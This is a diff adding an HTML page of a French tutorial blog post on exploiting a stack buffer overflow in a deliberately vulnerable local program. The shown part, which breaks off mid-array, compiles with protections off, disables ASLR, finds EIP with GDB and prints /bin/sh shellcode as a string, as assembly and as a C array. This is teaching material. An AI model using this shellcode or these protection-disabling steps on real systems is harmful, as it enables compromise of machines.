@@ -1,0 +1,497 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="author" content="nAptaX">
+    <link rel="shortcut icon" type="image/x-icon" href="//localhost:1313/img/favicon.ico">
+    <title>[PROLOG] 0x004, Local Shellcode par Stack Buffer OverFlow (Part 2) (French version)  | French Malware Analyst</title>
+    <meta name="description" content="Hello,
+Toujours dans cette série de billets d&rsquo;échauffement (série PROLOG), nous nous étions laissés la dernière fois sur un billet expliquant ce qu&rsquo;était un BUFFER OVERFLOW (le billet est ici). Je vous propose maintenant de passer à la pratique en obtenant un Shell par l&rsquo;utilisation d&rsquo;un STACK Buffer Overflow.
+Toujours dans un souci de pédagogie, nous allons prendre un exemple simple :
+Une erreur de programmation flagrante Un exécutable ne disposant d&rsquo;aucun moyen de protection de sa stack Un OS pour lequel nous aurions désactivé l&rsquo;ASLR qui le protège de ce type d&rsquo;exploitation Une execution locale (et non remote) Un peu plus tard, nous verrons que ces moyens de protection, même activés, sont eux aussi &lsquo;bypassable&rsquo; &hellip;">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-BmbxuPwQa2lc/FVzBcNJ7UAyJxM6wuqIj61tLrc4wSX0szH/Ev+nYRRuWlolflfl" crossorigin="anonymous">
+    
+    <link rel="preload stylesheet" href="/css/main.min.css" as="style">
+    <link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+    <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:200,400,200bold,400old">
+    
+    <!--[if lt IE 9]>
+			<script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+			<script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+		<![endif]-->
+
+    <script defer data-domain="naptax.re" src="https://plausible.io/js/script.js"></script>
+  </head>
+  <body>
+    <div id="content">
+  
+  <div class="container mb-3">
+  <nav class="navbar navbar-expand-lg">
+    <div class="container-fluid">
+      <a class="navbar-brand" href="//localhost:1313/">
+        <i class="fa fa-home"></i>
+      </a>
+      <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbar" aria-controls="navbar">
+        <i class="fa fa-bars"></i>
+      </button>
+
+      <div id="navbar" class="collapse navbar-collapse">
+        <ul class="navbar-nav ms-auto mb-2 mb-lg-0">
+          
+            
+              <li class="nav-item">
+                <li><a class="nav-link" href="/posts/">BLOG</a></li>
+              </li>
+            
+              <li class="nav-item">
+                <li><a class="nav-link" href="/cv/">ABOUT ME</a></li>
+              </li>
+            
+              <li class="nav-item">
+                <li><a class="nav-link" href="/edito-001/">EDITO</a></li>
+              </li>
+            
+          
+        </ul>
+      </div>
+    </div>
+  </div>
+</nav>
+
+
+  <div class="container">
+    <h3 class="mt-3"><b><a href="//localhost:1313/posts/fr/2022-11-26-prolog004/">[PROLOG] 0x004, Local Shellcode par Stack Buffer OverFlow (Part 2) (French version) </a></b></h3>
+    <div class="blog-title my-4">
+      <h6>
+        November 26, 2022
+        &nbsp;&nbsp;
+        
+          <span class="badge bg-success">prolog</span>
+        
+          <span class="badge bg-success">bof</span>
+        
+      </h6>
+    </div>
+    <div class="panel">
+      <div class="panel-body">
+        <div class="blogpost">
+          <center>
+<figure><img src="/images/ptitfantome.png" width="180"/>
+</figure>
+
+</center>
+<p><strong>Hello</strong>,</p>
+<p>Toujours dans cette série de billets d&rsquo;échauffement (série <em>PROLOG</em>), nous nous étions laissés la dernière fois sur un billet expliquant ce qu&rsquo;était un BUFFER OVERFLOW (<a href="/posts/fr/2022-10-6-prolog003/">le billet est ici</a>). Je vous propose maintenant de passer à la pratique en obtenant un Shell par l&rsquo;utilisation d&rsquo;un STACK Buffer Overflow.</p>
+<p>Toujours dans un souci de pédagogie, nous allons prendre un exemple simple :</p>
+<ul>
+<li>Une erreur de programmation flagrante</li>
+<li>Un exécutable ne disposant d&rsquo;aucun moyen de protection de sa stack</li>
+<li>Un OS pour lequel nous aurions désactivé l&rsquo;ASLR qui le protège de ce type d&rsquo;exploitation</li>
+<li>Une execution locale (et non remote)</li>
+</ul>
+<p>Un peu plus tard, nous verrons que ces moyens de protection, même activés, sont eux aussi &lsquo;bypassable&rsquo; &hellip;</p>
+<p>Je ne ferai pas de rappel théorique dans ce billet, pour cela je vous renvoie aux billets PROLOG précédents.</p>
+<h1 id="le-principe-de-base-du-stack-buffer-overflow">Le principe de base du Stack Buffer Overflow</h1>
+<p>Le principe de base consiste donc à venir écraser la valeur présente à l&rsquo;adresse de retour lors de l&rsquo;appel d&rsquo;une fonction.
+Cette valeur d&rsquo;EIP/RIP ayant été préalablement (et automatiquement) sauvegardée sur la pile au moment du CALL de cette fonction. La sauvegarde automatique par l&rsquo;instruction CALL de cette valeur est nécessaire afin de pouvoir rebrancher le flux d&rsquo;exécution une fois l&rsquo;exécution de la fonction terminée. &ldquo;Bah Oui, je vais où moi maintenant ? demande le processeur ;-)</p>
+<p>Plus précisément, nous souhaitons REMPLACER/SUBSTITUER cette valeur (une adresse mémoire) par une une autre adresse; adresse sur laquelle nous aurions préalablement &lsquo;posé&rsquo; notre Shellcode (ou toute autre forme de Payload).</p>
+<p>Donc, nous allons profiter de pouvoir écrire au-delà de la taille attendue (cf le Billet sur le Buffer Overflow), pour poser une chaîne de caractères qui sera exécutée par le processeur.</p>
+<h1 id="le-vilain-programme">Le vilain programme</h1>
+<p>Je sais, il est vilain, mais il va nous permettre d&rsquo;apprendre ;-)
+<script type="application/javascript" src="https://gist.github.com/naptax/5ad1d74fff3e76a5a13414651759ed37.js?file=buf.c"></script>
+</p>
+<p>A compiler (ici en 32 bit pour notre exemple) avec tous les mécanismes de protection désactivés</p>
+<p><code>gcc -fno-stack-protector -no-pie -m32 -z execstack bof.c -o BUF</code></p>
+<p>et pour désactiver l&rsquo;ASLR de votre OS:</p>
+<p><code># echo 0 &gt; /proc/sys/kernel/randomize_va_space</code></p>
+<p>Cette (vilaine) directive permet de faire en sorte que les adresses mémoire ne soient pas aléatoires au sein de la stack.</p>
+<p><strong>ATTENTION, il faudra remettre tout cela à 1 après nos travaux, si vous ne voulez pas fragiliser votre système. Un reboot du système rétablit aussi cette protection de l&rsquo;OS.</strong></p>
+<p>J&rsquo;utilise <strong>RIZIN / RZ-BIN</strong>, juste pour vérifier que mon binaire ait bien été compilé avec tous les mécanismes de protection désactivés:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$  rz-bin -I ./BUF
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Info<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>arch     x86
+</span></span><span style="display:flex;"><span>cpu      N/A
+</span></span><span style="display:flex;"><span>baddr    0x08048000
+</span></span><span style="display:flex;"><span>binsz    0x00003144
+</span></span><span style="display:flex;"><span>bintype  elf
+</span></span><span style="display:flex;"><span>bits     <span style="color:#ae81ff">32</span>  &lt; <span style="color:#f92672">====</span> Compilé pour <span style="color:#ae81ff">32</span> Bit
+</span></span><span style="display:flex;"><span>class    ELF32
+</span></span><span style="display:flex;"><span>compiler GCC: <span style="color:#f92672">(</span>Ubuntu 11.3.0-1ubuntu1~22.04<span style="color:#f92672">)</span> 11.3.0
+</span></span><span style="display:flex;"><span>dbg_file N/A
+</span></span><span style="display:flex;"><span>endian   LE
+</span></span><span style="display:flex;"><span>hdr.csum N/A
+</span></span><span style="display:flex;"><span>guid     N/A
+</span></span><span style="display:flex;"><span>intrp    /lib/ld-linux.so.2
+</span></span><span style="display:flex;"><span>laddr    0x00000000
+</span></span><span style="display:flex;"><span>lang     c
+</span></span><span style="display:flex;"><span>machine  Intel <span style="color:#ae81ff">80386</span>
+</span></span><span style="display:flex;"><span>maxopsz  <span style="color:#ae81ff">16</span>
+</span></span><span style="display:flex;"><span>minopsz  <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>os       linux
+</span></span><span style="display:flex;"><span>cc       N/A
+</span></span><span style="display:flex;"><span>pcalign  <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>relro    partial &lt; <span style="color:#f92672">====</span>
+</span></span><span style="display:flex;"><span>rpath    NONE
+</span></span><span style="display:flex;"><span>subsys   linux
+</span></span><span style="display:flex;"><span>stripped true 
+</span></span><span style="display:flex;"><span>crypto   false
+</span></span><span style="display:flex;"><span>havecode true
+</span></span><span style="display:flex;"><span>va       true
+</span></span><span style="display:flex;"><span>sanitiz  false
+</span></span><span style="display:flex;"><span>static   false
+</span></span><span style="display:flex;"><span>linenum  false
+</span></span><span style="display:flex;"><span>lsyms    false
+</span></span><span style="display:flex;"><span>canary   false  &lt; <span style="color:#f92672">====</span>
+</span></span><span style="display:flex;"><span>PIE      false  &lt; <span style="color:#f92672">====</span>
+</span></span><span style="display:flex;"><span>RELROCS  false
+</span></span><span style="display:flex;"><span>NX       false  &lt; <span style="color:#f92672">====</span>
+</span></span></code></pre></div><h1 id="comment-déterminer-cette-adresse-">Comment déterminer cette adresse ?</h1>
+<p>Nous disposons de plusieurs techniques pour déterminer l&rsquo;adresse mémoire de la sauvegarde d&rsquo;EIP. Je vous propose ici la plus simple:</p>
+<ol>
+<li>Prendre le programme sur GDB (ou RIZIN si vous le préférez à ce bon vieux GDB ;-)</li>
+<li>Flooder le buffer vulnérable pour déclencher le SEG FAULT</li>
+<li>Noter l&rsquo;adresse du SEG FAULT</li>
+</ol>
+<p><strong>C&rsquo;est à cette adresse que se trouve la sauvegarde d&rsquo;EIP (déposée lors du CALL) à laquelle nous devons inscrire le début de notre SHELLCODE</strong>.</p>
+<h3 id="we-love--pwntools-">We love ❤️ pwntools ❤️</h3>
+<p>Afin de gagner un peu de temps, nous allons utiliser l&rsquo;excellent framework python <strong>pwntools</strong>. Ce framework de CTF va nous rendre bien des services dans la mise au point de nos exploits. Le premier service qu&rsquo;il va nous rendre est de nous générer la séquence de caractères pour flooder notre buffer vulnérable:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$  python3 -m pip install --upgrade pwntools
+</span></span><span style="display:flex;"><span>$ cyclic <span style="color:#ae81ff">100</span> &gt; flood300.txt
+</span></span><span style="display:flex;"><span>$ cat flood300.txt
+</span></span><span style="display:flex;"><span>$ cat flood300 | wc -m
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">300</span>
+</span></span><span style="display:flex;"><span>$
+</span></span></code></pre></div><p><strong>Note</strong>: <em>Pour rendre <em>ce bon vieux GDB</em> un peu plus friendly pour le RE, je vous invite vivement à lui adjoindre le module <code>pwnDbg</code> qui vous dotera de 160 commandes fortes utiles et d&rsquo;une UX plus plaisante pour le debug et le RE.</em></p>
+<p>Donc en avant toute avec GDB et ses modules <strong>pwnDbg</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ gdb -q ./BUF
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pwndbg: loaded <span style="color:#ae81ff">160</span> pwndbg commands and <span style="color:#ae81ff">46</span> shell commands. Type pwndbg <span style="color:#f92672">[</span>--shell | --all<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>filter<span style="color:#f92672">]</span> <span style="color:#66d9ef">for</span> a list.
+</span></span><span style="display:flex;"><span>pwndbg: created $rebase, $ida gdb functions <span style="color:#f92672">(</span>can be used with print/break<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Reading symbols from ./BUF...
+</span></span><span style="display:flex;"><span>------- tip of the day <span style="color:#f92672">(</span>disable with set show-tips off<span style="color:#f92672">)</span> -------
+</span></span><span style="display:flex;"><span>Use the context <span style="color:#f92672">(</span>or ctx<span style="color:#f92672">)</span> command to display the context once again. You can reconfigure the context layout with set context-section &lt;sections&gt; or forward the output to a file/tty via set context-output &lt;file&gt;. See also config context to configure it further!
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>pwndbg&gt; r &lt; flood300.txt 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Starting program: /home/naptax/code/BUF/bin/LINUX-ELF/BUF &lt; flood300.txt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Thread debugging using libthread_db enabled<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Using host libthread_db library <span style="color:#e6db74">&#34;/lib/x86_64-linux-gnu/libthread_db.so.1&#34;</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>A quelle ONG spuhaitez-vous faire un don ? 
+</span></span><span style="display:flex;"><span>Vous avez fait un don de <span style="color:#ae81ff">1667326322</span> euros a l<span style="color:#e6db74">&#39;ONG aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Program received signal SIGSEGV, Segmentation fault.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">0x63616171 in ?? ()
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">──────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────────────────────
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">*EAX  0x160
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">*EBX  0x6361616f (&#39;</span>oaac<span style="color:#e6db74">&#39;)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> ECX  0x0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> EDX  0x0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">*EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0x0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">*ESI  0xffffd164 —▸ 0xffffd32f ◂— &#39;</span>/home/naptax/code/BUF/bin/LINUX-ELF/BUF<span style="color:#e6db74">&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">*EBP  0x63616170 (&#39;</span>paac<span style="color:#e6db74">&#39;)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">*ESP  0xffffd09c ◂— &#39;</span>raacsaactaacuaacvaacwaacxaacyaac<span style="color:#e6db74">&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">*EIP  0x63616171 (&#39;</span>qaac<span style="color:#e6db74">&#39;)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">────────────────────────────────────────────────────────────────────────────────────[ DISASM / i386 / set emulate on ]─────────────────────────────────────────────────────────────────────────────────────
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Invalid address 0x63616171
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">─────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────────────────────────────────────────
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">00:0000│ esp 0xffffd09c ◂— &#39;</span>raacsaactaacuaacvaacwaacxaacyaac<span style="color:#e6db74">&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">01:0004│     0xffffd0a0 ◂— &#39;</span>saactaacuaacvaacwaacxaacyaac<span style="color:#e6db74">&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">02:0008│     0xffffd0a4 ◂— &#39;</span>taacuaacvaacwaacxaacyaac<span style="color:#e6db74">&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">03:000c│     0xffffd0a8 ◂— &#39;</span>uaacvaacwaacxaacyaac<span style="color:#e6db74">&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">04:0010│     0xffffd0ac ◂— &#39;</span>vaacwaacxaacyaac<span style="color:#e6db74">&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">05:0014│     0xffffd0b0 ◂— &#39;</span>waacxaacyaac<span style="color:#e6db74">&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">06:0018│     0xffffd0b4 ◂— &#39;</span>xaacyaac<span style="color:#e6db74">&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">07:001c│     0xffffd0b8 ◂— &#39;</span>yaac<span style="color:#960050;background-color:#1e0010">&#39;</span>
+</span></span><span style="display:flex;"><span>───────────────────────────────────────────────────────────────────────────────────────────────<span style="color:#f92672">[</span> BACKTRACE <span style="color:#f92672">]</span>───────────────────────────────────────────────────────────────────────────────────────────────
+</span></span><span style="display:flex;"><span> ► f <span style="color:#ae81ff">0</span> 0x63616171
+</span></span><span style="display:flex;"><span>   f <span style="color:#ae81ff">1</span> 0x63616172
+</span></span><span style="display:flex;"><span>   f <span style="color:#ae81ff">2</span> 0x63616173
+</span></span><span style="display:flex;"><span>   f <span style="color:#ae81ff">3</span> 0x63616174
+</span></span><span style="display:flex;"><span>   f <span style="color:#ae81ff">4</span> 0x63616175
+</span></span><span style="display:flex;"><span>   f <span style="color:#ae81ff">5</span> 0x63616176
+</span></span><span style="display:flex;"><span>   f <span style="color:#ae81ff">6</span> 0x63616177
+</span></span><span style="display:flex;"><span>   f <span style="color:#ae81ff">7</span> 0x63616178
+</span></span><span style="display:flex;"><span>───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</span></span><span style="display:flex;"><span>pwndbg&gt; 
+</span></span></code></pre></div><p>On <strong>note bien</strong> les informations suivantes:</p>
+<pre tabindex="0"><code>1. EIP = 0x63616171, soit (&#39;qaac&#39; en ASCII), déclenche bien le SEG FAULT 
+2. ESP = 0xffffd09c
+</code></pre><p>Maintenant que nous savons comment remplacer l&rsquo;adresse à exécuter au retour du Call du <code>printf()</code>, il nous faut du code à éxécuter.</p>
+<center>
+<figure><img src="/images/virus-5.png" width="100"/>
+</figure>
+
+</center>
+<h2 id="hello-shellcode-">Hello Shellcode 🎁</h2>
+<p>Il existe des ouvrages entiers sur l`écriture de ShellCode, et je trouve personnellent assez rigolo de développer ces bouts de code malicieux. Néanmoins, je vous propose ici pour produire le notre de nous appuyer à nouveau sur <strong>pwntools</strong>.</p>
+<p>Ce que l&rsquo;on souhaite, c&rsquo;est un petit bout de code binaire qui nous donne un shell en éxécutant tout simplement la commande suivante <code>/bin/sh</code>.</p>
+<p>Afin de ne pas dévier de notre sujet, nous allons utiliser l&rsquo;outil <strong>shellcraft</strong> du framework <code>pwntools</code>. Nous sommes ici dans un contexte 32 bit sous Linux, so:</p>
+<pre tabindex="0"><code>$ shellcraft i386.linux.sh -f s
+
+&#34;jhh\x2f\x2f\x2fsh\x2fbin\x89\xe3h\x01\x01\x01\x01\x814\x24ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80&#34;
+</code></pre><p>Quelques paramètres de shellcraft utiles:</p>
+<ul>
+<li>Pour voir/produire votre Shellcode <strong>en ASM</strong></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span> shellcraft i386.linux.sh <span style="color:#f92672">-</span>f a
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* execve(path=&#39;/bin///sh&#39;, argv=[&#39;sh&#39;], envp=0) */</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* push b&#39;/bin///sh\x00&#39; */</span>
+</span></span><span style="display:flex;"><span>    push <span style="color:#ae81ff">0x68</span>
+</span></span><span style="display:flex;"><span>    push <span style="color:#ae81ff">0x732f2f2f</span>
+</span></span><span style="display:flex;"><span>    push <span style="color:#ae81ff">0x6e69622f</span>
+</span></span><span style="display:flex;"><span>    mov ebx, esp
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* push argument array [&#39;sh\x00&#39;] */</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* push &#39;sh\x00\x00&#39; */</span>
+</span></span><span style="display:flex;"><span>    push <span style="color:#ae81ff">0x1010101</span>
+</span></span><span style="display:flex;"><span>    xor dword ptr [esp], <span style="color:#ae81ff">0x1016972</span>
+</span></span><span style="display:flex;"><span>    xor ecx, ecx
+</span></span><span style="display:flex;"><span>    push ecx <span style="color:#75715e">/* null terminate */</span>
+</span></span><span style="display:flex;"><span>    push <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>    pop ecx
+</span></span><span style="display:flex;"><span>    add ecx, esp
+</span></span><span style="display:flex;"><span>    push ecx <span style="color:#75715e">/* &#39;sh\x00&#39; */</span>
+</span></span><span style="display:flex;"><span>    mov ecx, esp
+</span></span><span style="display:flex;"><span>    xor edx, edx
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* call execve() */</span>
+</span></span><span style="display:flex;"><span>    push SYS_execve <span style="color:#75715e">/* 0xb */</span>
+</span></span><span style="display:flex;"><span>    pop eax
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> <span style="color:#ae81ff">0x80</span>
+</span></span></code></pre></div><ul>
+<li>Pour <strong>tester/éxécuter</strong> votre Shellcode</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span> shellcraft i386.linux.sh <span style="color:#f92672">-</span>r
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[<span style="color:#f92672">*</span>] <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">/</span>tmp<span style="color:#f92672">/</span>pwn<span style="color:#f92672">-</span><span style="color:#66d9ef">asm</span><span style="color:#f92672">-</span>hb32fl7f<span style="color:#f92672">/</span>step3<span style="color:#f92672">-</span>elf<span style="color:#960050;background-color:#1e0010">&#39;</span>
+</span></span><span style="display:flex;"><span>    Arch:     i386<span style="color:#f92672">-</span><span style="color:#ae81ff">32</span><span style="color:#f92672">-</span>little
+</span></span><span style="display:flex;"><span>    RELRO:    No RELRO
+</span></span><span style="display:flex;"><span>    Stack:    No canary found
+</span></span><span style="display:flex;"><span>    NX:       NX disabled
+</span></span><span style="display:flex;"><span>    PIE:      No <span style="color:#a6e22e">PIE</span> (<span style="color:#ae81ff">0x8048000</span>)
+</span></span><span style="display:flex;"><span>    RWX:      Has RWX segments
+</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] Starting local process <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">/</span>tmp<span style="color:#f92672">/</span>pwn<span style="color:#f92672">-</span><span style="color:#66d9ef">asm</span><span style="color:#f92672">-</span>hb32fl7f<span style="color:#f92672">/</span>step3<span style="color:#f92672">-</span>elf<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">:</span> pid <span style="color:#ae81ff">5556</span>
+</span></span><span style="display:flex;"><span>[<span style="color:#f92672">*</span>] Switching to interactive mode
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span> id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span><span style="color:#ae81ff">1000</span>(naptax) gid<span style="color:#f92672">=</span><span style="color:#ae81ff">1000</span>(naptax) groups<span style="color:#f92672">=</span><span style="color:#ae81ff">1000</span>(naptax),<span style="color:#ae81ff">4</span>(adm),<span style="color:#ae81ff">24</span>(cdrom),<span style="color:#ae81ff">27</span>(sudo),<span style="color:#ae81ff">30</span>(dip),<span style="color:#ae81ff">46</span>(plugdev),<span style="color:#ae81ff">122</span>(lpadmin),<span style="color:#ae81ff">134</span>(lxd),<span style="color:#ae81ff">135</span>(sambashare)
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>      
+</span></span></code></pre></div><p>Avant l&rsquo;arrivée de <em>Shellcraft</em>, j&rsquo;avais pour habitude de &lsquo;crafter&rsquo; mes shellcodes à la main en C. De ce temps là, j&rsquo;ai gardé l&rsquo;habitude de les tester dans un programme C avant de les injecter ailleurs.</p>
+<p>Voici comment générer le Shellcode de <em>shellcraft</em> <strong>au format C</strong>, et le petit bout de code qui permet ensuite de le compiler et tester.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span> shellcraft i386.linux.sh <span style="color:#f92672">-</span>f c
+</span></span><span style="display:flex;"><span>{<span style="color:#ae81ff">0x6a</span>, <span style="color:#ae81ff">0x68</span>, <span style="color:#ae81ff">0x68</span>, <span style="color:#ae81ff">0x2f</span>, <span style="color:#ae81ff">0x2f</span>, <span style="color:#ae81ff">0x2f</span>, <span style="color:#ae81ff">0x73</span>, <span style="color:#ae81ff">0x68</span>, <span style="color:#ae81ff">0x2f</span>, <span style="color:#ae81ff">0x62</span>, <span style="color:#ae81ff">0x69</span>, <span style="color:#ae81ff">0x6e</span>, <span style="color:#ae81ff">0x89</span>, <span style="color:#ae81ff">0xe3</span>, <span style="color:#ae81ff">0x68</span>, <span style="color:#ae81ff">0x1</span>, <span style="color:#ae81ff">0x1</span>, <span style="color:#ae81ff">0x1</span>, <span style="color:#ae81ff">0x1</span>, <span style="color:#ae81ff">0x81</span>, <span style="color:#ae81ff">0x34</span>, <span style="color:#ae81ff">0x24</span>, <span style="color:#ae81ff">0x72</span>, <span style="color:#ae81ff">0x69</span>, <span style="color:#ae81ff">0x1</span>, <span style="color:#ae81ff">0x1</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0xc9</span>, <span style="color:#ae81ff">0x51</span>, <span style="color:#ae81ff">0x6a</span>, <span style="color:#ae81ff">0x4</span>, <span style="color:#ae81ff">0x59</span>, <span style="color:#ae81ff">0x1</span>, <span style="color:#ae81ff">0xe1</span>, <span style="color:#ae81ff">0x51</span>, <span style="color:#ae81ff">0x89</span>, <span style="color:#ae81ff">0xe1</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0xd2</span>, <span style="color:#ae81ff">0x6a</span>, <span style="color:#ae81ff">0xb</span>, <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0xcd</span>, <span style="color:#ae81ff">0x80</span>}
+</span></span><span style="display:flex;"><span>   
+</span></span></code></pre></div><p>à insérer dans le code suivant:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/mman.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> shellcode[] <span style="color:#f92672">=</span>  
+</span></span><span style="display:flex;"><span>{<span style="color:#ae81ff">0x6a</span>, <span style="color:#ae81ff">0x68</span>, <span style="color:#ae81ff">0x68</span>, <span style="color:#ae81ff">0x2f</span>, <span style="color:#ae81ff">0x2f</span>, <span style="color:#ae81ff">0x2f</span>, <span style="color:#ae81ff">0x73</span>, <span style="color:#ae81ff">0x68</span>, <span style="color:#ae81ff">0x2f</span>, <span style="color:#ae81ff">0x62</span>, <span style="color:#ae81ff">0x69</span>, <span style="color:#ae81ff">0x6e</span>, <span style="color:#ae81ff">0x89</span>, <span style="color:#ae81ff">0xe3</span>, <span style="color:#ae81ff">0x68</span>, <span style="color:#ae81ff">0x1</span>, <span style="color:#ae81ff">0x1</span>, <span style="color:#ae81ff">0x1</span>, <span style="color:#ae81ff">0x1</span>, <span style="color:#ae81ff">0x81</span>, <span style="color:#ae81ff">0x34</span>, <span style="color:#ae81ff">0x24</span>, <span style="color:#ae81ff">0x72</span>, <span style="color:#ae81ff">0x69</span>, <span style="color:#ae81ff">0x1</span>, <span style="color:#ae81ff">0x1</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0xc9</span>, <span style="color:#ae81ff">0x51</span>, <span 